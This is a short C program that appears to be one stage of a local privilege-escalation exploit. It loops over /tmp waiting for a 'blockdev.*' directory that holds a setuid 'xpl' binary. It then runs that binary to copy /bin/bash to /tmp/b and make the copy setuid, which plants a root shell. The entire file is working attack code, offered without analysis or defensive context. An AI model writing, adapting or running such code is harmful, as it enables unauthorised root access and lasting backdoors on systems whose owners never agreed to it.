#include <stdio.h>
#include <dirent.h>
#include <string.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char path[512], cmd[512];
    struct stat st;
    while(1) {
        DIR *d = opendir("/tmp");
        struct dirent *e;
        while((e = readdir(d))) {
            if(strncmp(e->d_name, "blockdev.", 9) == 0) {
                snprintf(path, sizeof(path), "/tmp/%s/xpl", e->d_name);
                if(stat(path, &st) == 0 && (st.st_mode & S_ISUID)) {
                    closedir(d);
                    snprintf(cmd, sizeof(cmd),
                        "%s -p -c 'cp /bin/bash /tmp/b; chmod 4755 /tmp/b'", path);
                    system(cmd);
                    return 0;
                }
            }
        }
        closedir(d);
    }
}
